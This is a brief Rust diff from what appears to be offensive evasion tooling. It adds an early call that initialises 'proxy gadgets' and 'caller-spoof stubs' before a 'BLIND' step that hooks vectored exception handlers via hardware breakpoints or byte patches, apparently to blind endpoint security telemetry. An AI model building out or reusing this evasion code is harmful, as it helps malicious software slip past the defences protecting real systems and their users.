@@ -143,6 +143,12 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     }
     diag_mark(b"4_pdata");
 
+    // ---- Countermeasure init (proxy gadgets, caller-spoof stubs, CFG probe) --
+    // Run BEFORE blind (VEH registration) so proxy gadgets and caller-spoof
+    // stubs are available when add_hwbp registers the first VEH handler.
+    unsafe { crate::blind_hwbp::init_countermeasures(); }
+    diag_mark(b"4b_countermeasures");
+
     // BLIND: HWBP → byte-patch fallback
     let mut hwbp_ok = false;
     if unsafe { crate::blind_hwbp::init_shadow_buffer() } {
